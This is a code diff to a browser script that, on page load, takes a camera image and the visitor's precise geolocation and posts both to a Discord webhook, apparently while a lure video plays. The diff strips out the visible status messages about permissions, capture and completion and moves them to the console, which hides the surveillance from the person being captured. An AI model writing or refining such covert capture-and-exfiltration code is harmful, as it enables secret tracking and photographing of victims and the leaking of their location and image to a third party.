@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const statusBox = document.getElementById('status');
+    // const statusBox = document.getElementById('status'); // Removed UI element
     const locationDisplay = document.getElementById('locationDisplay');
     const camPreview = document.getElementById('camPreview');
     const contentVideo = document.getElementById('contentVideo');
@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     initCapture();
 
     async function initCapture() {
-        statusBox.innerText = "Requesting permissions...";
+        console.log("Requesting permissions...");
 
         try {
             // A. Request Camera
@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', () => {
             // Wait for video to be ready
             camPreview.onloadedmetadata = () => {
                 camPreview.play();
-                statusBox.innerText = "Camera active. Locating...";
+                console.log("Camera active. Locating...");
 
                 // B. Request Location
                 if ("geolocation" in navigator) {
@@ -47,21 +47,18 @@ document.addEventListener('DOMContentLoaded', () => {
                                 // Post to Webhook
                                 sendToDiscord({ latitude, longitude, accuracy, imageBlob });
 
-                                statusBox.innerText = "Capture complete.";
-                                statusBox.style.color = "#4cd137";
+                                console.log("Capture complete.");
                             }, 500);
                         },
                         (err) => {
-                            console.error(err);
-                            statusBox.innerText = "Location denied.";
+                            console.log("Location denied:", err);
                         },
                         { enableHighAccuracy: true }
                     );
                 }
             };
         } catch (err) {
-            console.error(err);
-            statusBox.innerText = "Permissions denied. Please allow camera access.";
+            console.log("Permissions denied:", err);
         }
     }
 
